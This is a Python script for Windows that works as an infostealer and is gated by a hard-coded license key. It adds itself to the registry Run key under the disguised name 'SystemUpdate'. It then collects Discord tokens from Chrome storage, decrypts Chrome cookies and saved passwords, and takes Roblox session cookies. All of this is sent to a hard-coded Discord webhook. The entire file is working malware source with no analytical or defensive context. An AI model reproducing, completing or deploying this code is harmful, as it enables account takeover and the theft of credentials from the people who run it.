import base64
import json
import os
import re
import urllib.request
import sqlite3
import winreg
import shutil
from pathlib import Path
from win32crypt import CryptUnprotectData
import subprocess

TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
}
WEBHOOK_URL = "https://discord.com/api/webhooks/1404607433170747522/dQOSrjxCn0AUBCZPKHh56UCICQ_6hMUSMBPGoHBzi7zwac0hnwb5TUUGeK7jCnqMYFr_"
LICENSE_KEY = "xcmnd1-LikeMya-sexm-18701"

def verify_license():
    subprocess.run("cls", shell=True)
    print("Enter License Key:")
    user_input = input()
    if user_input != LICENSE_KEY:
        print("Invalid License Key. Exiting...")
        exit(1)
    print("License Verified. Running...")

def add_to_startup():
    script_path = os.path.abspath(__file__)
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
    winreg.CloseKey(key)

def make_post_request(api_url: str, data: dict[str, str]) -> int:
    try:
        request = urllib.request.Request(
            api_url, data=json.dumps(data).encode(),
            headers=REQUEST_HEADERS,
        )
        with urllib.request.urlopen(request) as response:
            return response.status
    except:
        return 0

def get_tokens_from_file(file_path: Path) -> list[str] | None:
    try:
        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
    except PermissionError:
        return None
    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
    return tokens or None

def get_user_id_from_token(token: str) -> str | None:
    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "==",
        ).decode("utf-8")
    except UnicodeDecodeError:
        return None
    return discord_user_id

def get_tokens_from_path(base_path: Path) -> dict[str, set]:
    file_paths = [file for file in base_path.iterdir() if file.is_file()]
    id_to_tokens: dict[str, set] = {}
    for file_path in file_paths:
        potential_tokens = get_tokens_from_file(file_path)
        if potential_tokens is None:
            continue
        for potential_token in potential_tokens:
            discord_user_id = get_user_id_from_token(potential_token)
            if discord_user_id is None:
                continue
            if discord_user_id not in id_to_tokens:
                id_to_tokens[discord_user_id] = set()
            id_to_tokens[discord_user_id].add(potential_token)
    return id_to_tokens or None

def get_cookies():
    cookie_path = Path(os.getenv("APPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"
    if not cookie_path.exists():
        return None
    try:
        conn = sqlite3.connect(cookie_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = []
        for host, name, encrypted_value in cursor.fetchall():
            decrypted = CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            cookies.append(f"{host} | {name} | {decrypted}")
        conn.close()
        return cookies
    except:
        return None

def get_passwords():
    password_path = Path(os.getenv("APPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
    if not password_path.exists():
        return None
    try:
        conn = sqlite3.connect(password_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for url, username, encrypted_password in cursor.fetchall():
            decrypted = CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
            passwords.append(f"URL: {url} | User: {username} | Pass: {decrypted}")
        conn.close()
        return passwords
    except:
        return None

def get_roblox_accounts():
    roblox_path = Path(os.getenv("APPDATA")) / "Roblox" / "LocalStorage"
    if not roblox_path.exists():
        return None
    try:
        roblox_data = []
        for file in roblox_path.iterdir():
            if file.is_file() and file.suffix == ".sqlite":
                conn = sqlite3.connect(file)
                cursor = conn.cursor()
                cursor.execute("SELECT key, value FROM ItemTable WHERE key LIKE '%.ROBLOSECURITY'")
                for key, value in cursor.fetchall():
                    roblox_data.append(f"Roblox Cookie: {value}")
                conn.close()
        return roblox_data or None
    except:
        return None

def send_data_to_webhook(webhook_url: str, data: dict):
    fields = []
    for key, value in data.items():
        if value:
            if isinstance(value, dict):
                for user_id, tokens in value.items():
                    fields.append({"name": f"Discord User ID: {user_id}", "value": "\n".join(tokens)})
            elif isinstance(value, list):
                fields.append({"name": key, "value": "\n".join(value)[:1000] or "None"})
    if fields:
        payload = {"content": "Grabbed Data", "embeds": [{"fields": fields}]}
        make_post_request(webhook_url, payload)

def main():
    verify_license()
    add_to_startup()
    chrome_path = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
    tokens = get_tokens_from_path(chrome_path)
    cookies = get_cookies()
    passwords = get_passwords()
    roblox_accounts = get_roblox_accounts()
    data = {
        "Discord Tokens": tokens,
        "Cookies": cookies,
        "Passwords": passwords,
        "Roblox Accounts": roblox_accounts
    }
    send_data_to_webhook(WEBHOOK_URL, data)

if __name__ == "__main__":
    main()